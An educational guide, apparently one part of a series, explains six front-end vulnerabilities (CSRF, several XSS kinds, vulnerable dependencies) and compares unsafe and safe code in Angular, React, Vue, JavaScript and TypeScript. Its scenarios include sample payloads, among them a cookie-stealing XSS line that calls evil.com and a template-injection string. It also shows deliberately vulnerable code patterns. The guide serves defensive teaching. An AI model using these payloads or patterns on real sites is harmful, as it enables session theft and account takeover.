# Front-end Vulnerabilities: Explained Simply (Part 8)
### Angular, React, Vue.js, JavaScript and TypeScript

Part A explains the **6 unique problems** (each has: **Think of it like** → **Scenario** → **Why it works** → **Fix**).
Part B shows **what each problem looks like in each framework** (unsafe code vs safe code).

## Words you will see a lot

- **Front-end**: the part of a website that runs **in the user's browser** (buttons, forms, pages).
- **Framework**: a toolkit that helps build front-ends faster (Angular, React, Vue). **JavaScript** is the language they use, and **TypeScript** is JavaScript with extra type labels.
- **DOM**: the browser's **live copy of the page** that JavaScript can read and change.
- **XSS (Cross-Site Scripting)**: an attacker makes **their script run inside your website** in the victim's browser. The script then acts as the victim: steals data, clicks buttons, shows fake forms.
- **Escape / Encode**: turning dangerous characters into harmless text (`<` becomes `&lt;`), so the browser **shows** it instead of **running** it.
- **Sanitize**: cleaning HTML by **removing the dangerous parts** (like `<script>` and `onerror=`) but keeping the safe parts (like `<b>`).
- **Template**: a page layout with blanks to fill (`Hello {{name}}`).
- **Component**: a reusable building block of a page (a button, a comment box).
- **npm package**: a library downloaded for your project.
- **Cookie / token**: the proof that you're logged in.
- **CSP (Content Security Policy)**: a rule from the website to the browser: "only run scripts from these trusted places."

!!! info "Golden rule for front-ends"

    *Frameworks are safe **by default**, and the bugs appear when the developer **turns the safety off** (innerHTML, v-html, dangerouslySetInnerHTML, bypassSecurityTrust...). Treat all user data as **text**, never as **code**.*


---

## PART A: THE 6 PROBLEMS

## 1. Cross-Site Request Forgery (CSRF)

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/352.html" target="_blank" rel="noopener noreferrer">CWE-352</a> <span class="vtag owasp">OWASP A01:2021</span></p>
*(in your notes for Angular, React, Vue, JavaScript and TypeScript)*

!!! tip "Think of it like"

    You're the boss with an **automatic approval stamp**. A stranger slips a fake request onto your desk. You don't read it, but the stamp is automatic, so it gets approved.

!!! example "Scenario"


    1. Ravi is logged in to `mybank.com`. His browser keeps the login **cookie**.
    2. He opens another tab with a funny meme page that contains a **hidden form**: `POST mybank.com/transfer?to=hacker&amount=10000`.
    3. The browser **automatically attaches the bank's cookie** to any request going to `mybank.com`, even when the request starts on another site.
    4. The bank sees a valid cookie and thinks Ravi sent it.

!!! warning "Why it works"

    The website only checks "is there a valid cookie?" and not "did the user **really** intend this?" Front-end frameworks don't fix this alone; **the server must check**.

!!! success "Fix"


    - **CSRF token**: a secret random value that the real page sends with each change request. The attacker's page can't know it, so the forged request fails. Angular's `HttpClient` and Axios (used in React/Vue) can automatically send an `X-XSRF-TOKEN` header if the server sets an `XSRF-TOKEN` cookie.
    - Set cookies with **`SameSite=Lax` or `Strict`** (and `Secure`, `HttpOnly`), so the browser won't send them from other sites.
    - Use POST/PUT/DELETE for changes (never GET), and check the `Origin` header on the server.
    - For high-risk actions, ask the user to confirm (password or OTP).

    *(Note: if you keep tokens in `localStorage` and send them in a header, CSRF is not an issue, but any XSS can steal them. That's a trade-off, so fixing XSS matters even more.)*

---

## 2. Direct DOM Manipulation XSS

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/79.html" target="_blank" rel="noopener noreferrer">CWE-79</a> <a class="vtag atk" href="https://attack.mitre.org/techniques/T1059/007/" target="_blank" rel="noopener noreferrer" title="JavaScript">ATT&amp;CK T1059.007</a> <span class="vtag owasp">OWASP A03:2021</span></p>
*(in all five)*

!!! tip "Think of it like"

    Instead of using the building's **proper reception**, a developer **walks straight into the control room** and pastes whatever visitors gave him onto the main display.

!!! example "Scenario"


    1. A page shows a comment using `element.innerHTML = comment`.
    2. Arjun posts this comment: `<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">`
    3. The browser tries to load the broken image, fails, and runs the `onerror` code.
    4. His script sends **every visitor's cookie** to his server. If the admin views the page, he takes over the admin account.

!!! warning "Why it works"

    `innerHTML`, `outerHTML`, `document.write()`, `insertAdjacentHTML()` and `eval()` all mean **"treat this text as real code/HTML."** Using them bypasses the framework's protection.

!!! success "Fix"


    - Use **`textContent`** (or the framework's normal binding), which shows the text as plain words.
    - Build elements with `document.createElement` and set safe properties.
    - If you really need HTML, **sanitize** it with **DOMPurify** first.
    - Add a **CSP** and **Trusted Types** as a safety net, and set session cookies `HttpOnly` so scripts can't read them.

---

## 3. Template Concatenation / Untrusted Template Usage XSS

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/1336.html" target="_blank" rel="noopener noreferrer">CWE-1336</a> <a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/79.html" target="_blank" rel="noopener noreferrer">CWE-79</a> <span class="vtag owasp">OWASP A03:2021</span></p>
*(Angular: "template concatenation", Vue/JS/TS: "untrusted template usage")*

!!! tip "Think of it like"

    A printing shop gives customers a **blank template** with fixed spaces (name, address). But one shop lets customers **write the template itself**. A customer writes a template with a hidden instruction, and the shop's machine follows it.

!!! example "Scenario"


    1. A developer builds a page by **joining strings**: `"<h1>Hello " + userName + "</h1>"`, then compiles it as a template.
    2. Priya sets her name to `{{constructor.constructor('alert(document.cookie)')()}}` (an expression written for the framework's template language).
    3. The framework compiles the string **as a template**, so it runs her expression: **template injection**, leading to XSS (and sometimes full script execution).
    4. This also happens when an app takes a template **from the server or database** where a user can edit it.

!!! warning "Why it works"

    The framework's template syntax (`{{ }}`, `v-` directives, `*ngIf`...) is **code-like**. If user text becomes part of the **template itself** (not just the data filling it), the attacker writes code.

!!! success "Fix"


    - **Templates must be written only by developers**, and users supply only the **data**.
    - Never concatenate user input into a template string, never compile templates at runtime from user data (`new Vue({template: userInput})`, Angular's JIT `Compiler`, `_.template(userInput)`, Handlebars with user-provided templates).
    - Use **ahead-of-time (AOT)** compilation in Angular and the **runtime-only build** in Vue (without the template compiler).
    - Keep user text in `{{ }}` as **data**, which is escaped automatically.

---

## 4. Sanitization Misuse XSS

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/79.html" target="_blank" rel="noopener noreferrer">CWE-79</a> <a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/116.html" target="_blank" rel="noopener noreferrer">CWE-116</a> <span class="vtag owasp">OWASP A03:2021</span></p>
*(Angular)*

!!! tip "Think of it like"

    A **security guard** checks every bag. But a clever developer tells the guard, "**I personally guarantee this bag is safe. Don't check it.**" Anyone who can slip a bag into that line goes through unchecked.

!!! example "Scenario"


    1. Angular **automatically sanitizes** HTML put in `[innerHTML]`, removing scripts and event handlers.
    2. A developer gets annoyed because a style or an iframe gets removed, so he writes: `this.safe = sanitizer.bypassSecurityTrustHtml(userComment);`
    3. Now the guard **trusts everything** in `userComment`. Sneha puts `<img src=x onerror=...>` in her comment, and it **runs**.

!!! warning "Why it works"

    The `bypassSecurityTrust...` methods tell Angular to **skip** its safety checks. They're meant only for **content you fully control**.

!!! success "Fix"


    - **Don't bypass** the sanitizer for anything a user touched, even indirectly (URLs, comments, profile bios, data from APIs).
    - If you need richer HTML, **sanitize it yourself with DOMPurify first**, and only then (rarely) mark it trusted.
    - Search your code for `bypassSecurityTrust` during reviews (it's a red flag), and add a lint rule.

---

## 5. Untrusted HTML Rendering XSS

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/79.html" target="_blank" rel="noopener noreferrer">CWE-79</a> <a class="vtag atk" href="https://attack.mitre.org/techniques/T1059/007/" target="_blank" rel="noopener noreferrer" title="JavaScript">ATT&amp;CK T1059.007</a> <span class="vtag owasp">OWASP A03:2021</span></p>
*(React, Vue, JavaScript, TypeScript)*

!!! tip "Think of it like"

    A **notice board that prints exactly what you hand over, including hidden instructions**, and every reader's phone obeys those instructions.

!!! example "Scenario"


    1. A profile page shows a user's bio with React: `<div dangerouslySetInnerHTML={{__html: user.bio}} />` (Vue: `<div v-html="user.bio">`).
    2. Kiran sets his bio to `<img src=x onerror="stealCookies()">` and saves it. It's **stored in the database**.
    3. Every person who opens his profile **runs the script** (this is **stored XSS**).

!!! warning "Why it works"

    React and Vue normally **escape** text. `dangerouslySetInnerHTML` and `v-html` switch that off on purpose, as their names warn.

!!! success "Fix"


    - **Avoid them.** Use normal binding: React `{user.bio}`, Vue `{{ user.bio }}`.
    - If you must show HTML (e.g., a rich-text blog), **sanitize with DOMPurify** right before rendering: `DOMPurify.sanitize(user.bio)`.
    - Also sanitize on the **server** when you save, and apply a **CSP**.
    - Be careful with links: `<a href={userUrl}>` can run `javascript:alert(1)`. Allow only `http:` and `https:` URLs.

---

## 6. Components with Known Vulnerabilities

<p class="vuln-tags"><a class="vtag cwe" href="https://cwe.mitre.org/data/definitions/1395.html" target="_blank" rel="noopener noreferrer">CWE-1395</a> <a class="vtag atk" href="https://attack.mitre.org/techniques/T1195/001/" target="_blank" rel="noopener noreferrer" title="Compromise Software Dependencies and Development Tools">ATT&amp;CK T1195.001</a> <span class="vtag owasp">OWASP A06:2021</span></p>
*(React, but it applies to all)*

!!! tip "Think of it like"

    Building your shop using **ready-made shelves from many suppliers**. If one shelf design is known to collapse and you never replace it, it's your shop that falls.

!!! example "Scenario"


    1. A React project has 1,500 packages (most are installed indirectly).
    2. An old version of a popular package (a markdown renderer or a date library) has a **published XSS or code-execution bug**.
    3. The team never updates it. An attacker finds the public exploit and uses it against the site.
    4. Another case: a **malicious package** with a look-alike name (`reqct` instead of `react`) or a hijacked library that steals secrets during install.

!!! warning "Why it works"

    Modern front-ends are **mostly other people's code**, and public bug lists (CVEs) tell attackers exactly what to try.

!!! success "Fix"


    - Run **`npm audit`** (and `npm audit fix`), and use **Dependabot/Snyk** for automatic alerts.
    - **Commit the lock file** (`package-lock.json`) and install with `npm ci`, so versions can't change silently.
    - Use fewer packages, check the name, maintainer and downloads before adding one, and **update regularly**.
    - Consider disabling install scripts (`--ignore-scripts`) for untrusted packages.

---

## PART B: WHAT IT LOOKS LIKE IN EACH FRAMEWORK

## Angular
Angular **escapes `{{ }}` and sanitizes `[innerHTML]` automatically**. Danger appears when you bypass it.

| Problem | Unsafe | Safe |
|---|---|---|
| CSRF | Server accepts cookie-only POSTs | Enable Angular's XSRF support (`HttpClientXsrfModule` / `withXsrfConfiguration`), set SameSite cookies, check on the server |
| Direct DOM XSS | `this.el.nativeElement.innerHTML = userInput` | `<p>{{ userInput }}</p>` or `renderer.setProperty(el, 'textContent', userInput)` |
| Template concatenation XSS | `Compiler`/JIT compiles `"<div>" + userInput + "</div>"` | Fixed templates + AOT; user data only inside `{{ }}` |
| Sanitization misuse XSS | `sanitizer.bypassSecurityTrustHtml(userInput)` | `<div [innerHTML]="userInput"></div>` (auto-sanitized), or DOMPurify first |

## React
React escapes everything inside `{ }` by default (JSX).

| Problem | Unsafe | Safe |
|---|---|---|
| CSRF | Cookie-only auth, no token/SameSite | SameSite cookies + CSRF token header (e.g., via Axios `xsrfCookieName`) |
| Direct DOM XSS | `ref.current.innerHTML = userInput` or `document.getElementById('x').innerHTML = ...` | `<div>{userInput}</div>` or `ref.current.textContent = userInput` |
| Components with known vulnerabilities | Old, unchecked packages | `npm audit`, Dependabot, lock file, fewer packages |
| Untrusted HTML rendering XSS | `<div dangerouslySetInnerHTML={{__html: userInput}} />` | `<div>{userInput}</div>` or `{__html: DOMPurify.sanitize(userInput)}` |

## Vue.js
Vue escapes `{{ }}` and `:attr` bindings by default.

| Problem | Unsafe | Safe |
|---|---|---|
| Untrusted template usage XSS | `new Vue({ template: userInput })` or `compile(userInput)` | Fixed templates in `.vue` files, and the **runtime-only** Vue build |
| Untrusted HTML rendering XSS | `<div v-html="userInput"></div>` | `<div>{{ userInput }}</div>` or `v-html="DOMPurify.sanitize(userInput)"` |
| Direct DOM XSS | `this.$refs.box.innerHTML = userInput` | `this.$refs.box.textContent = userInput` or normal binding |
| CSRF | Cookie-only auth | SameSite cookies + CSRF token (Axios XSRF support) |

## JavaScript (plain)
No framework, so **nothing is automatic**. You must be careful every time.

| Problem | Unsafe | Safe |
|---|---|---|
| Direct DOM XSS | `el.innerHTML = userInput`, `document.write(userInput)`, `eval(userInput)` | `el.textContent = userInput` or `createElement` |
| Untrusted template usage | `_.template(userInput)()`, or building HTML with template literals: `` el.innerHTML = `<li>${name}</li>` `` | Fixed templates; data inserted as text or escaped |
| CSRF | `fetch('/transfer', {method:'POST', credentials:'include'})` with no token | Send a CSRF token header, SameSite cookies, server checks |
| Untrusted HTML rendering XSS | `el.innerHTML = apiResponse.html` | `DOMPurify.sanitize(apiResponse.html)` or `textContent` |

## TypeScript
TypeScript is JavaScript plus types, and **types disappear when the code runs in the browser**. A variable typed `string` can still contain `<script>`. So TypeScript **does not stop XSS**; it only helps you write safer code.

| Problem | Unsafe | Safe |
|---|---|---|
| Untrusted HTML rendering XSS | `el.innerHTML = data.html as string` | `el.textContent = data.html`, or `DOMPurify.sanitize(data.html)` |
| CSRF | Same as JS: cookie-only POSTs | CSRF token header + SameSite cookies |
| Untrusted template usage | `` `<div>${(input as any)}</div>` `` compiled as a template | Fixed templates; data separate |
| Direct DOM XSS | `(document.getElementById('x') as HTMLElement).innerHTML = input` | `.textContent = input` |

**TypeScript tips:** validate data at **runtime** (for example with `zod`), avoid `as any` on user data, and use **Trusted Types** (`TrustedHTML`) so the browser only accepts HTML that was explicitly sanitized.

---

## One safety net for ALL frameworks (defence in depth)

1. **CSP**: only allow scripts from your own domain, and block inline scripts (`script-src 'self'`).
2. **`HttpOnly`, `Secure`, `SameSite`** cookies: scripts can't read them, and other sites can't send them.
3. **Trusted Types**: the browser refuses raw strings in dangerous places like `innerHTML`.
4. **ESLint security rules**: flag `innerHTML`, `dangerouslySetInnerHTML`, `v-html`, `bypassSecurityTrust` and `eval` in code review.
5. **Dependency scanning** (`npm audit`, Dependabot, Snyk).

---

## Quick summary

| Problem | Angular | React | Vue | JS | TS | One-line defence |
|---|:-:|:-:|:-:|:-:|:-:|---|
| 1 CSRF | ✔ | ✔ | ✔ | ✔ | ✔ | CSRF token + SameSite cookies + server checks |
| 2 Direct DOM XSS | ✔ | ✔ | ✔ | ✔ | ✔ | `textContent`, not `innerHTML` |
| 3 Template concatenation / untrusted template | ✔ | | ✔ | ✔ | ✔ | Developers write templates, users supply data only |
| 4 Sanitization misuse | ✔ | | | | | Never bypass the sanitizer for user data |
| 5 Untrusted HTML rendering | | ✔ | ✔ | ✔ | ✔ | Avoid `v-html`/`dangerouslySetInnerHTML`, or use DOMPurify |
| 6 Known-vulnerable components | | ✔ | | | | `npm audit`, lock file, update |

!!! success "Memory trick"

    *"Text is safe, HTML is dangerous, templates are code."* Show user data as **text**, sanitize it before treating it as **HTML**, and never let users write **templates**. Then add a token for forms (CSRF) and keep your packages updated.
